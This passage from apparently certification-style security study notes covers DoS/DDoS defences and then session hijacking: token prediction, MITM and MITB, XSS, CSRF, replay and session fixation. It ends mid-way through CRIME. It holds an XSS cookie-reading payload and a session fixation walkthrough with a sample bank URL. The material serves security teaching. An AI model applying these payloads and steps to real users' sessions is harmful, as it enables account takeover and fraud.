				- Packet traceback involves tracing attack traffic back to its source, similar to reverse engineering. In this method, the targeted victim works backward, tracing the packets to their origin. Once the true source is identified, the victim can take steps to block further attacks from that source by implementing the necessary preventive measures.
				- Additionally, packet traceback can provide valuable insights into the tools and techniques used by the attacker. This information can help in developing and implementing various filtering techniques to block future attacks.
			- Event Log Analysis:
				- DDoS event logs play a crucial role in forensic investigations and law enforcement, especially when an attacker causes significant financial damage. Providers can use honeypots and other network security mechanisms, such as firewalls, packet sniffers, and server logs, to store all events that occurred during the setup and execution of the attack. This allows network administrators to identify the type of DDoS attack or the combination of attacks used.
				- Logs from routers, firewalls, and intrusion detection systems (IDS) can be analyzed to trace the source of the DoS traffic. Additionally, network administrators can work with intermediary ISPs and law enforcement agencies to trace the attacker’s IP address.
	- Techniques to Defend Against Botnets:
		- RFC 3704 Filtering:
			- RFC 3704 is a basic access control list (ACL) filter designed to limit the impact of DDoS attacks by blocking traffic with spoofed addresses. This filter ensures that packets come from valid, allocated address space that matches the network topology and address allocation.
			- A "bogon list" includes all unused or reserved IP addresses that should not originate from the Internet. Any traffic coming from these unused or reserved IP addresses is considered bogus and should be filtered by the ISP before it enters the Internet link. If a packet is sourced from an IP address on the bogon list, it is likely from a spoofed source and should be dropped by the filter.
			- System administrators should verify that their ISP performs RFC 3704 filtering in the cloud before traffic enters their systems. Since the bogon list changes regularly, if the ISP does not perform RFC 3704 filtering, the system administrator must manage their own bogon ACL rules or switch to another ISP.
		- Cisco IPS Source IP Reputation Filtering:
			- Reputation services help determine whether an IP address or service is a source of threat. Cisco Global Correlation, a security feature of Cisco IPS 7.0, leverages extensive security intelligence. The Cisco SensorBase Network contains data on all known Internet threats, including botnets, malware outbreaks, dark nets, and botnet harvesters. Cisco IPS utilizes this network to filter DoS traffic before it can harm critical assets. To detect and prevent malicious activity even earlier, it integrates global threat data into its system.
		- Black Hole Filtering:
			- Black-hole filtering is a common technique used to defend against botnets and prevent DoS attacks. Black holes refer to network nodes where incoming traffic is discarded or dropped without notifying the source that the data did not reach its intended recipient.
			- Undesirable traffic can be dropped before it enters a protected network using a method called remotely triggered black-hole (RTBH) filtering. Since this is a remotely triggered process, it must be implemented in collaboration with the ISP. RTBH filtering utilizes Border Gateway Protocol (BGP) host routes to direct traffic to the victim’s servers to a "null0" next hop, effectively discarding it.
		- DDoS Prevention Offerings from ISP or DDoS Service:
			- This method is effective in preventing IP spoofing at the ISP level. The ISP scrubs or cleans traffic before allowing it to enter a user’s Internet link. Since this service operates in the cloud, DDoS attacks do not saturate the Internet links. Additionally, some third-party providers offer cloud-based DDoS prevention services.
			- IP Source Guard (in Cisco) or similar features in other routers can be enabled to filter traffic based on the DHCP snooping binding database or IP source bindings, preventing bots from sending spoofed packets.
	- Additional DoS/DDoS Countermeasures:
		- Use WPA2/WPA3 and AES 256 encryption to defend against eavesdropping.
		- Keep software and protocols updated, and scan for anomalies.
		- Update the kernel and disable unused or insecure services.
		- Block inbound packets from service ports to prevent reflection attacks.
		- Enable TCP SYN cookie protection and prevent spoofed packets at the ISP level.
		- Use cognitive radios to handle jamming and scrambling attacks.
		- Block ICMP traffic via firewalls and secure remote administration.
		- Perform input validation and avoid unsafe functions like gets and strcpy.
		- Monitor the network perimeter with advanced surveillance tools.
		- Ensure timeout functions for semi-accessible connections.
		- Implement distributed server models and colocation services to reduce server overload.
		- Ensure servers are free from bottlenecks and failure points.
		- Use third-party services for enhanced DDoS protection.
		- Adopt multi-cloud models for application backup during DDoS attacks.
		- Simulate DoS/DDoS attacks to prepare countermeasures.
		- Share threat intelligence with peers and stay updated on attack trends.
		- Use AI/ML for anomaly detection and limit network broadcasting.
		- Disable unnecessary services like echo and chargen.
	- DoS/DDoS Protection at ISP Level:
		- One of the most effective ways to defend against DoS attacks is to block them at the gateway, a task typically handled by the contracted ISP. ISPs offer a "clean pipes" service-level agreement (SLA), which guarantees bandwidth for legitimate traffic rather than for all incoming traffic. In many cases, ISPs block all requests during a DDoS attack, even legitimate ones. If an ISP does not offer clean-pipes services, cloud-based subscription services can be used instead.
		- These services act as intermediaries, receiving traffic destined for the network, filtering it, and forwarding only trusted connections. Providers such as Imperva and VeriSign offer cloud protection against DoS attacks.
		- ISPs also offer in-the-cloud DDoS protection for Internet links to prevent saturation during an attack. This protection redirects attack traffic to the ISP’s infrastructure, where it can be filtered. Administrators can request that the ISP block the original affected IP and move their site to a new IP after performing DNS propagation.
	- Enabling TCP Intercept on Cisco IOS Software:
		- TCP intercept can be enabled by executing commands in global configuration mode.
		- An access list serves three purposes:
			- Interception of all connection requests.
			- Interception of requests originating from specific networks.
			- Interception of requests destined for specific servers.
		- Typically, an access list defines the source as any and the destination as specific networks or servers. Since identifying the source of intercepted packets is unnecessary, source addresses are not filtered. Instead, the destination server or network to be protected is specified. TCP intercept can operate in either active intercept mode or passive watch mode, with the default being intercept mode.
		- Active Intercept Mode: In this mode, the Cisco IOS software actively intercepts all inbound connection requests (SYN) and responds with a SYN-ACK on behalf of the server. It then waits for an ACK from the client. Upon receiving the ACK, the software completes the three-way handshake with the server by sending the original SYN. Once the handshake is complete, the two half connections (client-to-software and software-to-server) are linked.
		- Passive Watch Mode: In this mode, connection requests pass directly to the server without active interception. The software monitors the connection setup. If the connection fails to establish within 30 seconds, the software sends a reset request to the server to clear its state.
	- Advanced DDoS Protection Appliances:
		- FortiDDoS 200F, 1500E, 1500E-DC, 1500F, 2000E, 2000E-DC, and VM04/08/16:
			- FortiDDoS utilizes a massively parallel machine-learning architecture to deliver advanced, low-latency DDoS attack mitigation without the performance compromises typically associated with CPU-based systems. It inspects both inbound and outbound Layer 3, 4, and 7 packets down to the smallest sizes, ensuring fast and accurate detection and mitigation of attacks.
		- Quantum DDoS Protector:
			- Check Point’s Quantum DDoS Protector provides multi-layered protection to block DDoS attacks effectively.
			- Advantages:
				- Comprehensive Multi-Layered Protection:
					- Implements behavioral protection by baselining multiple elements and blocking abnormal traffic.
					- Offers automatically generated and predefined signatures.
					- Utilizes advanced challenge/response techniques.
				- Fast Response Time:
					- Protects against attacks within seconds.
					- Automatically defends against network floods and application-layer attacks.
					- Delivers customized protection tailored to the specific security requirements of a network environment.
					- Filters traffic quickly before it reaches the firewall, safeguarding networks and servers while blocking exploits.
				- Flexible Deployment Options:
					- Adaptable to meet the needs of businesses of all sizes.
				- Seamless Integration:
					- Fully integrated with Check Point Security Management for unified protection and management.
		- Huawei AntiDDoS1000 DDoS Protection System:
			- The Huawei AntiDDoS1000 DDoS protection system leverages Big Data analytics technology and supports modeling for over 60 types of network traffic to deliver second-level attack responses and comprehensive defense against more than 100 types of attacks.
			- The AntiDDoS1000 can be deployed on a user network in in-line mode to provide real-time protection against volumetric and application-layer attacks. If attack traffic exceeds the bandwidth or defense capacity of a local scrubbing device, the AntiDDoS1000 collaborates with the upstream carrier’s or ISP’s AntiDDoS device to mitigate flood attacks and ensure service continuity.
		- A10 Thunder TPS:
			- The A10 Thunder Threat Protection System (TPS) ensures reliable access to critical network services by detecting and blocking external threats, such as DDoS and other cyberattacks, before they escalate into costly service disruptions.
			- Features:
				- Maintain Service Availability: Protects key network services from interruptions caused by malicious attacks.
				- Defeat Growing Attacks: Effectively mitigates the increasing volume and sophistication of cyberattacks.
				- Scalable Protection: Offers scalable solutions to meet the evolving security demands of growing networks.
				- Reduce Security OpEx: Minimizes operational expenses associated with security management.
	- DoS/DDoS Protection Tools:
		- Anti DDoS Guardian (beethink.com) : Anti DDoS Guardian is a powerful DDoS attack protection tool designed to secure various systems, including IIS servers, Apache servers, game servers, Camfrog servers, mail servers, FTP servers, VOIP PBX systems, and SIP servers. It monitors each incoming and outgoing packet in real-time, displaying detailed information about network flow such as local and remote addresses. The tool effectively limits the number of network flows, client bandwidth, concurrent TCP connections, and TCP connection rates. It also controls UDP traffic by restricting bandwidth usage, connection rates, and packet rates, ensuring robust protection against potential threats.
		- DDoS-GUARD (ddos-guard.net)
		- DOSarrest’s DDoS Protection Service (www.dosarrest.com)
		- Radware DefensePro X (www.radware.com)
		- Gatekeeper (github.com)
		- F5 DDoS Attack Protection (www.f5.com)
	- DoS/DDoS Protection Services:
		- Cloudflare : Cloudflare's DDoS protection service enables organizations to safeguard their networks against distributed denial-of-service attacks by leveraging its 100 Tbps global network, which blocks an average of 87 billion threats daily. The service ensures rapid mitigation within three seconds, utilizing advanced technologies such as BGP-based protection and seamless integration with Layer 7 services. This approach delivers comprehensive security while minimizing operational costs.
		- Akamai DDoS Protection : Akamai DDoS Protection uses dedicated infrastructure to protect Internet-facing applications and systems while providing fast, secure, and reliable DNS services. It mitigates DDoS attacks and blocks malicious traffic in the cloud before they reach applications, data centers, or infrastructure, removing the need for multiple firewalls.
		- Stormwall PRO (stormwall.network)
		- Imperva DDoS Protection (www.imperva.com)
		- Nexusguard (www.nexusguard.com)
		- BlockDoS (www.blockdos.net)


--------------------------------------------------

# Session Hijacking

- When a web server successfully authenticates a client, it generates a session identification token or key, which is sent to the client. These session tokens are used to differentiate and manage multiple active sessions on the server. Web servers typically rely on mechanisms to generate random tokens and implement security controls to protect these tokens during transmission.
- Session hijacking is a type of cyberattack where an attacker takes control of an active Transmission Control Protocol (TCP) session between two computers. Since most authentication processes occur only at the start of a TCP session, an attacker can exploit this vulnerability to gain unauthorized access to a system while the session is ongoing. By intercepting and analyzing the traffic of an established TCP session, attackers can steal sensitive information, commit identity theft, or engage in fraudulent activities.
- This attack often targets weaknesses in the session-token generation process or token security measures, allowing the attacker to acquire a valid session ID. With a stolen or guessed session ID, the attacker can impersonate the legitimate user and establish an unauthorized connection to the target server. Once this connection is established, the web server unknowingly processes the attacker’s requests as if they originated from the authenticated user. Session hijacking can enable attackers to launch various other forms of attacks, such as man-in-the-middle (MITM) attacks and denial-of-service (DoS) attacks.
- Factors Contributing to Session Hijacking:
	- Absence of Account Lockout for Invalid Session IDs:
		- If a website does not implement account lockout mechanisms, attackers can repeatedly attempt to connect using varying session IDs embedded in legitimate URLs. This process, known as a brute-force attack, allows attackers to try multiple session IDs until they identify the correct one. During such attacks, the web server often fails to display warning messages or impose restrictions, enabling the attacker to eventually determine a valid session ID.
	- Weak Session-ID Generation Algorithms or Short Session IDs:
		- Many websites use linear or predictable algorithms to generate session IDs, often relying on easily guessed variables such as timestamps or IP addresses. By analyzing patterns and sending multiple requests, attackers can narrow the search space to forge a valid session ID. Even when a robust algorithm is used, short session IDs reduce the complexity of guessing or brute-forcing the ID, making them more vulnerable to attack.
	- Insecure Handling of Session IDs:
		- Attackers can exploit vulnerabilities in the handling of session IDs to retrieve stored information. For instance, by misleading a user’s browser into visiting a malicious site, attackers can intercept session IDs before they expire. Techniques like DNS poisoning, cross-site scripting (XSS), or exploiting browser vulnerabilities allow attackers to misuse session IDs for unauthorized access.
	- Indefinite Session Timeout:
		- Session IDs that do not have a set expiration time give attackers unlimited opportunities to guess or steal a valid session ID. For example, the "remember me" option on many websites may lead to static session IDs, which attackers can exploit if they gain access to a user’s cookie file. Additionally, if attackers compromise a proxy server that logs or caches session IDs, they can hijack sessions more easily.
	- Vulnerability of TCP/IP Protocol:
		- All machines using TCP/IP are inherently vulnerable to session hijacking due to design flaws in the protocol. These flaws allow attackers to intercept and manipulate communication between clients and servers.
	- Lack of Encryption:
		- Most countermeasures against session hijacking fail without proper encryption. On unsecured networks, attackers can easily sniff session IDs during transmission if transport-layer security, such as Secure Sockets Layer (SSL) or Transport Layer Security (TLS), is not properly configured. Even when encryption is used, attackers can gain access if session IDs include sensitive information, such as login credentials.
- Session Hijacking Process:
	- Session hijacking allows attackers to take over an active session after user authentication. Once hijacked, the attacker can redirect traffic, plant backdoors, or access sensitive data without raising suspicion.
	- The process typically involves three phases:
		- Tracking the Connection: The attacker uses tools like network sniffers or Nmap to monitor the victim’s session and capture TCP sequence (SEQ) and acknowledgment (ACK) numbers. These numbers are then used to craft valid packets to impersonate the victim.
		- Desynchronizing the Connection:
			- The attacker disrupts the SEQ/ACK synchronization between the target and server by:
			- Sending Null Data: Advances the server’s SEQ/ACK numbers, desynchronizing the session.
			- Resetting the Connection: Sends an RST flag to terminate the server’s connection with the target, then establishes a new connection with the server using spoofed packets.
			- Avoiding Detection: Keeps the target unaware by ensuring responses from the server appear normal. Poor desynchronization may cause excess network traffic (e.g., ACK storms), revealing the attack.
		- Injecting Malicious Packets:
			- Once in control, the attacker can:
			- Inject Data: Send commands or malicious payloads to the server.
			- Act as a Man-in-the-Middle: Intercept, modify, or relay data between the target and server while maintaining control over the session.
	- Effective encryption, secure session management, and monitoring are crucial to prevent session hijacking.
- Packet Analysis of Local Session Hijack:
	- Session hijacking leverages high-level attack vectors that can compromise numerous systems. Since many systems rely on TCP for data transmission over LANs or the Internet, attackers exploit vulnerabilities in the TCP three-way handshake to take control of active sessions.
	- An attacker begins by sniffing network traffic to monitor or track an ongoing session. The next step is to desynchronize the session. If the attacker knows the Next Sequence Number (NSN) used by the client, they can hijack the session by sending a packet with the NSN before the client uses it.
	- There are two main methods to determine sequence numbers:
		- Sniffing Traffic: By capturing an ACK packet during the session, the attacker can calculate the NSN based on the information in the packet.
		- Guessing Sequence Numbers: The attacker guesses sequence numbers and sends packets with those guesses. However, this method is unreliable and less effective compared to sniffing.
	- If the attacker has access to the network and can sniff the TCP session, determining the sequence number becomes straightforward. This form of session hijacking is referred to as "local session hijacking."
- Types of Session Hijacking:
	- Session hijacking can be classified into two types based on the attacker’s involvement: active and passive. The key distinction is that an active hijack involves taking control of an existing session, while a passive hijack focuses on monitoring the session without interference.
	- Passive Session Hijacking:
		- In a passive attack, the attacker observes and records traffic during an active session without disrupting it. Using network sniffers, attackers can capture sensitive information such as user IDs and passwords, which they can later exploit to log in as a legitimate user and gain privileges.
		- Example: Password sniffing, a common method for gaining raw access to a network.
		- Countermeasures: Techniques like one-time passwords (e.g., S/KEY) and ticketing systems (e.g., Kerberos) can prevent sniffing attacks. However, these measures do not protect against active attacks if data is unencrypted or lacks a digital signature.
	- Active Session Hijacking:
		- In an active attack, the attacker takes control of an existing session by disrupting the connection or directly participating in the session.
		- Example: A Man-in-the-Middle (MITM) attack, where the attacker intercepts and manipulates data between the server and client. To execute this, the attacker must predict the sequence number before the target responds to the server.
		- Modern Challenges: Most modern operating systems use randomized initial sequence numbers, making sequence-number prediction significantly harder.
- Session Hijacking in the OSI Model:
	- Session hijacking can occur at two levels in the OSI model: the network level and the application level.
	- Network-Level Hijacking:
		- Network-level hijacking involves intercepting packets during the transmission between a client and server in a TCP or User Datagram Protocol (UDP) session. A successful attack enables the attacker to gather critical information, which can be further used to compromise application-level sessions.
		- Attackers often target the network level because it does not require tailoring the attack for each specific web application. Instead, this method focuses on the shared protocol data flow common across all web applications.
	- Application-Level Hijacking:
		- Application-level hijacking involves gaining control over the Hypertext Transfer Protocol (HTTP) user session by obtaining session IDs. At this level, the attacker gains control of an existing session or creates new, unauthorized sessions by using the stolen data.
		- In general, network-level and application-level hijacking are used together, depending on the system being targeted.
- Spoofing vs. Hijacking:
	- Blind Hijacking: Blind hijacking involves predicting TCP sequence numbers to impersonate a host without observing reply packets. Attackers rely on sequence-number prediction to hijack communications, exploiting trust between users and machines. Since ARP poisoning and observing replies are impractical across networks, attackers must anticipate responses while preventing TCP/RST packets from the host.
	- Spoofing Attacks: In spoofing, attackers impersonate users or machines to gain access by initiating new sessions with stolen credentials. IP spoofing, a simple technique, requires predicting sequence numbers to establish connections. However, spoofing without session hijacking doesn’t require sequence prediction and often involves source routing to intercept traffic. Active hijacking displaces legitimate users from sessions, leveraging their privileges, while session spoofing uses stolen authentication credentials to start new sessions.
	- Session Hijacking: Session hijacking occurs when attackers take over active sessions after legitimate users authenticate. Displacement often involves DoS attacks, with attackers needing precise knowledge of session state and TCP sequence numbers. This method is more complex than IP spoofing due to the control required.
	- Defenses Against Spoofing and Hijacking: Encryption (SSL, PPTP) and per-packet integrity checking prevent spoofing and hijacking by securing communications and sequence integrity. Without encryption, attackers can exploit non-encrypted TCP traffic by sniffing, predicting sequence numbers, and using ARP cache poisoning on local networks.
- Application-Level Session Hijacking:
	- In application-level session hijacking, an attacker steals or predicts a valid session token to gain unauthorized access to a web server or create a new unauthorized session. Typically, network-level and application-level session hijacking occur together because a successful network-level session hijack provides an attacker with sufficient information to perform application-level session hijacking. Application-level session hijacking primarily relies on HTTP sessions.
	- Techniques To Obtain Valid Session ID:
		- Stealing: Attackers may gain physical access to retrieve files containing session IDs or memory contents from the user’s system or the server. Alternatively, attackers can use sniffing tools like Wireshark or Riverbed Packet Analyzer Plus to capture traffic between the client and server, extracting session IDs from intercepted packets.
		- Guessing: Attackers attempt to guess session IDs by analyzing session variables. In session hijacking scenarios, the range of possible session ID values that can be guessed is often limited. Consequently, guessing is effective only when servers employ weak or flawed session ID generation mechanisms.
		- Brute Forcing: In a brute-force attack, an attacker systematically attempts all possible permutations of session ID values until finding one that is valid. For example, an attacker using a digital subscriber line (DSL) can generate up to 1,000 session IDs per second. This technique is particularly effective when the session ID generation algorithm is non-random. If the predicted range of session ID values is small, this attack is referred to as a session prediction attack.
	- Session Token Compromise Methods:
		- Session Sniffing
		- Predictable Session Tokens
		- Man-in-the-Middle (MITM) Attacks
		- Man-in-the-Browser Attacks
		- Cross-Site Scripting (XSS) Attacks
		- Cross-Site Request Forgery (CSRF) Attacks
		- Session Replay Attacks
		- Session Fixation Attacks
		- CRIME Attacks
		- Forbidden Attacks
		- Session Donation Attacks
		- PetitPotam Hijacking
	- Compromising Session IDs Using Sniffing:
		- A web server identifies a user’s connection through a unique session ID (also known as a session token). After successful authentication during client login, the web server sends a session token to the client browser. Typically, a session token consists of a variable-length string and can be utilized in several ways, such as in the header of an HTTP request (cookie), within a URL, or in the body of an HTTP request.
		- Attackers can use packet-sniffing tools, such as Wireshark and Riverbed Packet Analyzer Plus, to intercept HTTP traffic between a victim and the web server. By analyzing the captured packets, attackers can extract valuable information, including session IDs and passwords. Once the session ID is identified, the attacker can impersonate the victim by sending the stolen session ID to the web server before the victim does. This allows the attacker to use the valid session token to gain unauthorized access to the web server. In this way, the attacker takes control of an existing legitimate session.
	- Compromising Session IDs by Predicting Session Tokens:
		- A session ID serves as proof of an authenticated session established between a user and a web server. If an attacker can guess or predict a user’s session ID, fraudulent activity becomes possible. Session prediction allows an attacker to bypass the authentication mechanisms of an application. Typically, attackers exploit session IDs generated by weak algorithms to impersonate legitimate website users. They analyze the variable section of session IDs to detect patterns. This analysis may be conducted manually or through the use of cryptanalytic tools.
		- An attacker gathers a large number of simultaneous session IDs to collect samples within the same time window while keeping certain variables constant. Initially, the attacker collects valid session IDs to identify patterns that authenticate users. The attacker then examines the structure of the session ID, the information used to generate it, and the algorithm employed by the web application for security. Using these insights, the attacker can predict the session ID.
		- In addition to prediction, attackers may also use brute-force techniques to guess session IDs. This involves generating and testing multiple session ID values until they successfully gain unauthorized access to the application.
		- Predict Session Token:
			- Most web servers generate session IDs using either custom algorithms or predefined patterns, which may simply increment static numbers. Others, however, employ more complex procedures that incorporate factors such as time and other system-specific variables.
			- The attacker can carry out an attack through the following steps:
				- The attacker obtains the current session ID and connects to the web application.
				- The attacker uses a brute-force technique or calculates the next session ID.
				- The attacker modifies the current session ID value in the cookie, URL, or hidden form field to impersonate the next user’s identity.
			- Analyzing Token Patterns:
				- Sequential Tokens: When session tokens are issued sequentially (e.g., 001, 002, 003), attackers can observe the series of tokens to identify patterns. If an attacker notices that the tokens increment by one each time, they can predict the next token by simply adding 1 to the last observed token.
				- Timestamp-Based Tokens: Tokens that include predictable elements, such as timestamps, are easier to predict. If a token incorporates a timestamp, an attacker can estimate the token value based on the current time.
			- Brute-Force Attacks:
				- Small Token Space Size: If the token space (the total number of possible tokens) is small, brute-force attacks become feasible. Attackers can systematically attempt all possible token values until they find a valid one. For example, tokens ranging from 0000 to 9999 are limited to just 10,000 possible values. An attacker can write a script to try each of these values until a match is found.
				- Lack of Rate-Limiting: Without rate-limiting, attackers can generate and test numerous tokens without being blocked. This enables them to perform brute-force attacks more efficiently. For example, an attacker could attempt 1,000 tokens per minute. Without rate-limiting in place, they can continue indefinitely until a valid token is found.
			- Weak Random Number Generators:
				- Predictable PRNG: Pseudorandom number generators (PRNGs) that are not truly random or are poorly seeded can produce predictable token sequences. If an attacker can determine the seed or algorithm used, they can predict future tokens. For example, if a PRNG uses the current time as a seed and the attacker is aware of this, they can replicate the token generation process and predict the tokens.
	- Compromising Session IDs Using Man-in-the-Middle or Manipulator-in-the-Middle Attack:
		- A man-in-the-middle (MITM) or manipulator-in-the-middle attack involves intruding into an existing connection between systems to intercept messages being transmitted. In this attack, the attacker employs various techniques to split a single TCP connection into two separate connections: one between the client and the attacker (client-to-attacker connection), and another between the attacker and the server (attacker-to-server connection).
		- Once the TCP connection is successfully intercepted, the attacker can read, modify, and inject fraudulent data into the communication. In the case of an HTTP transaction, the attacker specifically targets the TCP connection between the client and the server.
	- Compromising Session IDs Using Man-in-the-Browser (MITB) or Manipulator-in-the-Browser Attack:
		- A man-in-the-browser (MITB) or manipulator-in-the-browser attack is similar to a man-in-the-middle (MITM) attack, but the key difference is that it uses a Trojan horse to intercept and manipulate the communication between a browser and its security mechanisms or libraries. In this attack, the attacker positions a Trojan—already installed on the victim's system—between the browser and its security components. The Trojan can modify web pages, alter transaction content, or insert additional fraudulent transactions. All activities performed by the Trojan are invisible to both the user and the web application.
		- The primary goal of this attack is financial theft, particularly by manipulating transactions within internet banking systems. A man-in-the-browser attack can succeed even when security mechanisms such as SSL, public key infrastructure (PKI), and two-factor authentication are in place because all expected security measures appear to function normally.
		- In a Man-in-the-Browser attack, a Trojan infects the system and installs malicious code in the browser’s configuration. Once the browser is restarted, the code loads and monitors webpage visits. When the user logs into a targeted site, the Trojan extracts and modifies form data using the DOM interface. The modified data is sent to the server, which cannot distinguish it from the original. After the server processes the transaction, a receipt is generated and displayed with the original details, leaving the user unaware of the interception.
	- Compromising Session IDs Using Client-Side Attacks:
		- Client-side attacks target vulnerabilities in client applications that interact with malicious servers or process malicious data. Depending on the vulnerability, an attacker can exploit the application by sending an email with a malicious link or tricking a user into visiting a malicious website. Vulnerable client-side applications include unprotected websites, Java Runtime Environment, and browsers, with browsers being the major target.
		- Client-side attacks occur when clients establish connections malicious servers and process potentially harmful data. If there is no interaction between the client and server, no client-side attack is possible. For example, running a File Transfer Protocol (FTP) client without connecting to an FTP server avoids such attacks. In instant messaging, however, the application requires clients to log in to a remote server, making it more susceptible to client-side attacks.
		- The following client-side attacks can be used to compromise session IDs:
			- Cross-Site Scripting (XSS): XSS allows attackers to inject malicious client-side scripts into web pages that are viewed by other users.
			- Malicious JavaScript Codes: An attacker can embed a malicious script in a webpage that silently captures session tokens in the background and sends them to the attacker without triggering any warnings.
			- Trojans: A Trojan horse can modify the proxy settings in the user’s browser to route all sessions through the attacker’s machine.
	- Compromising Session IDs Using Client-Side Attacks: Cross-Site Scripting (XSS) Attack:
		- A cross-site scripting (XSS) attack is a client-side attack in which an attacker compromises a session token using malicious code or programs. This type of attack occurs when a dynamic web page receives malicious data from the attacker and executes it on the user’s system. Websites that generate dynamic pages cannot fully control how clients process the output, making them vulnerable to attack.
		- Attackers can insert malicious JavaScript, VBScript, ActiveX, HTML, or Flash applets into a vulnerable dynamic page. Once executed on the user’s machine, these scripts can collect personal information, steal cookies, redirect users to unexpected pages, or execute other malicious actions.
		- The user first establishes a valid session with the server. The attacker then sends a crafted link with malicious JavaScript. When the user clicks the link, the JavaScript runs automatically and performs the actions set by the attacker, such as displaying the user’s current session ID.
		Using this technique, the attacker can create specific JavaScript code to fetch the user’s session ID, such as: <SCRIPT>alert(document.cookie);</SCRIPT>
		- The attacker can then use the stolen session ID to establish a valid session with the server.
	- Compromising Session IDs Using Client-Side Attacks: Cross-Site Request Forgery (CSRF) Attack:
		- Cross-Site Request Forgery (CSRF), also known as a one-click attack or session riding, is an attack where the attacker exploits the victim’s active session with a trusted site to perform malicious activities such as unauthorized item purchases or the modification and retrieval of account information. In a CSRF web attack, the attacker creates a malicious form containing harmful information and sends it to the victim. When the victim unwittingly submits the form, the web server processes it as if it were a legitimate request because it originates from the authenticated user. Unlike cross-site scripting (XSS) attacks, which exploit the trust a user places in a website, CSRF exploits the trust a website places in the user's browser.
		- Steps Involved in a CSRF Attack:
			- In a CSRF attack, the attacker hosts a malicious web page containing a seemingly legitimate form that already includes the malicious request. The victim, deceived by the form’s appearance, interacts with it by entering credentials or other sensitive details.
			- Once the victim submits the form, it is sent to the trusted site via a POST or GET request. The trusted server, unaware of the malicious intent, processes the request as if it originated from the authenticated user’s browser since the user’s active session credentials are attached.
			- This results in the server unwittingly executing the attacker’s request, leading to unauthorized actions on the victim's behalf.
	- Compromising Session IDs Using Session Replay Attacks
		- In a session replay attack, the attacker captures a user’s authentication token by eavesdropping on the communication between the user and the server. Once the authentication token is captured, the attacker replays the authentication request to the server with the captured token to dodge the server, bypassing security checks and gaining unauthorized access to the server.
		- Steps Involved in a Session Replay Attack:
			- In a session replay attack, the user first establishes a connection with the web server, and the server requests authentication information as proof of identity.
			- The user then sends authentication tokens to the server. During this exchange, the attacker intercepts the communication and captures the user’s authentication token.
			- Finally, the attacker replays the request to the server using the stolen token, gaining unauthorized access.
	- Compromising Session IDs Using Session Fixation:
		- Web session security is designed to prevent attackers from intercepting, brute-forcing, or predicting the session ID issued by a web server to a user’s browser as proof of an authenticated session. However, this security approach overlooks the possibility of an attacker issuing a session ID to the user’s browser, forcing it to use a session ID chosen by the attacker. This type of attack is known as a session fixation attack because the attacker “fixes” the user's session ID in advance, rather than allowing the server to generate it randomly at the time of login.
		- The goal of a session fixation attack is to hijack a valid user session by exploiting flaws in the web application's session ID management. Many web applications allow users to authenticate themselves using an existing session ID instead of generating a new one upon login. In this scenario, the attacker provides a legitimate session ID to the victim and persuades the victim’s browser to use it. Once the victim logs in using the attacker-supplied session ID, the attacker, who already knows the session ID, can hijack the authenticated session.
		- Unlike other types of session hijacking, which involve stealing or predicting a session ID after the user has logged in, a session fixation attack involves fixing the session ID on the user’s browser before the user logs in.
		- Session Fixation Attack Techniques:
			- Attackers employ various methods to perform session fixation attacks, including:
			- Session Token in the URL Argument: The attacker embeds the session ID in a URL and tricks the victim into clicking the link.
			- Session Token in Hidden Form Field: The session ID is included in a hidden form field on a web page that the victim is lured into submitting.
			- Session ID in Cookie: The attacker manipulates cookies in the victim’s browser to insert the chosen session ID.
		- Session Fixation Attack Phases:
			- The attacker selects a technique based on how the target web application manages session tokens. The vulnerability exploited in a session fixation attack occurs when a server allows a user to authenticate using a fixed session ID. The attacker provides a valid session ID to the victim and persuades them to authenticate using that session ID.
			- A session fixation attack typically unfolds in the following three phases:
				- Session Set-Up Phase: In this phase, the attacker establishes a legitimate session with the target web server to obtain a valid session ID. If the target web server supports an idle session timeout feature, the attacker must ensure the session ID remains active by periodically sending requests to the server.
				- Fixation Phase: The attacker introduces the pre-established session ID to the victim’s browser, thereby "fixing" the session ID on the victim’s end.
				- Entrance Phase: The attacker waits for the victim to log in to the web server using the pre-determined session ID. Once the victim logs in, the attacker can access the victim's session using the same session ID.
		- Session Fixation Attack Steps:
			- Establishing the Session: The attacker first establishes a legitimate connection with the target web server. For example, the target server (e.g., http://citibank.com/) issues the attacker a session ID, such as 0D6441FEA4496C2.
			- Sharing the Fixed Session ID: The attacker embeds the established session ID in a URL, such as http://citibank.com/?SID=0D6441FEA4496C2, and sends it to the victim, often through email, messaging apps, or phishing websites.
			- Victim Interaction: The victim clicks the link, believing it to be legitimate (e.g., sent by the bank). This opens the login page of the server in the victim’s browser, with the session ID 0D6441FEA4496C2 already in use.
			- Login Process: The victim enters their credentials on the login page. The server recognizes that session ID 0D6441FEA4496C2 is active and associates it with the victim’s account, granting the victim access to their account without generating a new session.
			- Session Hijacking: Since the attacker already knows the session ID (0D6441FEA4496C2), they can access the victim's account by using the same session ID in a URL, such as http://citibank.com/?SID=0D6441FEA4496C2.
		- Key Insight: In a session fixation attack, the user unknowingly logs into a session that was pre-established by the attacker. This allows the attacker to share the same session as the victim and gain unauthorized access to sensitive resources or accounts.
	- Session Hijacking Using Proxy Servers:
		- In this attack, the attacker lures the victim into clicking on a bogus malicious link that appears legitimate but secretly redirects the victim’s request to the attacker’s server. The attacker’s server then forwards the request to the legitimate server on behalf of the victim and serves as a proxy for the entire transaction.
		- Acting as a proxy, the attacker intercepts and captures session information during the interaction between the legitimate server and the victim. This allows the attacker to gain unauthorized access to the victim’s session and potentially steal sensitive information or perform malicious actions on the victim’s behalf.
	- Session Hijacking Using CRIME Attack:
		- Compression Ratio Info-Leak Made Easy (CRIME) is a client-side attack that exploits vulnerabilities in the data compression features of protocols such as SSL/TLS (Transport Layer Security), SPDY, and HTTPS (HTTP Secure). The low potential for mitigating HTTPS compression vulnerabilities makes this attack particularly dangerous compared to other compression-related vulnerabilities.
		- When two hosts establish a connection using HTTPS, a TLS session is created, and data is transmitted in encrypted form. This encryption makes it difficult for attackers to read or modify the messages exchanged between the hosts. When a user logs into a web application, authentication data is typically stored in a cookie. This cookie is then used for authentication whenever the browser sends an HTTPS request to the web application.
		- In a CRIME attack, the attacker attempts to access the authentication cookie to hijack the victim’s session. By decrypting the session cookies, the attacker gains authentication information that can be used to establish a new session with the web application, effectively impersonating the victim.
		- CRIME Attacks Working:
			- In HTTPS, cookies are compressed using a lossless data compression algorithm (like DEFLATE) before encryption. As a result, the cookie value cannot be easily obtained through simple packet sniffing. However, a CRIME attack bypasses this protection by exploiting the way compression impacts the size of encrypted data.
			- Steps to Execute CRIME Attack:
				- Social Engineering: The attacker tricks the victim into clicking on a malicious link. This may inject malicious code into the victim's system or redirect them to a malicious website.
